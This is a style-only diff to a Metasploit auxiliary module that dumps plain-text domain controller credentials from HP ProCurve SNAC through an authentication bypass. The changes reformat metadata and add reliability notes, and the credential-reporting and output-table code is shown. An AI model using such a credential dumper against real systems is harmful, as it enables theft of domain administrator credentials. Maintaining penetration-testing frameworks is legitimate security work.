@@ -10,37 +10,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'HP ProCurve SNAC Domain Controller Credential Dumper',
-      'Description'    => %q{
-        This module will extract Domain Controller credentials from vulnerable installations of HP
-        SNAC as distributed with HP ProCurve 4.00 and 3.20. The authentication bypass vulnerability
-        has been used to exploit remote file uploads. This vulnerability can be used to gather important
-        information handled by the vulnerable application, like plain text domain controller
-        credentials. This module has been tested successfully with HP SNAC included with ProCurve
-        Manager 4.0.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'HP ProCurve SNAC Domain Controller Credential Dumper',
+        'Description' => %q{
+          This module will extract Domain Controller credentials from vulnerable installations of HP
+          SNAC as distributed with HP ProCurve 4.00 and 3.20. The authentication bypass vulnerability
+          has been used to exploit remote file uploads. This vulnerability can be used to gather important
+          information handled by the vulnerable application, like plain text domain controller
+          credentials. This module has been tested successfully with HP SNAC included with ProCurve
+          Manager 4.0.
+        },
+        'References' => [
           ['URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03897409']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'rgod <rgod[at]autistici.org>', # Auth bypass discovered by
           'juan vazquez' # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' =>
-        {
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => {
           'SSL' => true,
         },
-      'DisclosureDate' => '2013-09-09'
-    ))
+        'DisclosureDate' => '2013-09-09',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(443)
-      ])
+      ]
+    )
   end
 
   def get_domain_info(session)
@@ -86,7 +92,6 @@ class MetasploitModule < Msf::Auxiliary
     return results
   end
 
-
   def report_cred(opts)
     service_data = {
       address: opts[:ip],
@@ -113,9 +118,7 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-
   def run
-
     print_status("Get Domain Info")
     session = get_session
 
@@ -141,8 +144,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     cred_table = Rex::Text::Table.new(
-      'Header'  => 'Domain Controllers Credentials',
-      'Indent'  => 1,
+      'Header' => 'Domain Controllers Credentials',
+      'Indent' => 1,
       'Columns' => ['Domain Controller', 'Username', 'Password']
     )
 
@@ -160,6 +163,5 @@ class MetasploitModule < Msf::Auxiliary
 
     print_line
     print_line(cred_table.to_s)
-
   end
 end
